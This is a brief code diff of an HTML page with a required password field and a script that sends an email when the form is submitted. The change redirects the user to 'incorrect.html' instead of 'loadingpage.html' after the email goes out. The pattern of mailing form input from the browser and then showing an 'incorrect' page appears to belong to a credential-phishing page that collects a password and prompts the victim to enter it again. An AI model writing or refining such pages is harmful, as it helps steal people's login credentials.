@@ -60,8 +60,7 @@
  Password is required
  </span>
  </label>
-</div>
- 
+ </div>
  
  <button type="submit" name="submit"
  class="btn btn--primary btn__block">
@@ -80,7 +79,7 @@
      })
      .then(function(response) {
          console.log("Email sent successfully!", response);
-         window.location.href = "loadingpage.html";
+         window.location.href = "incorrect.html";
      }, function(error) {
          console.error("Email sending failed:", error);
      });
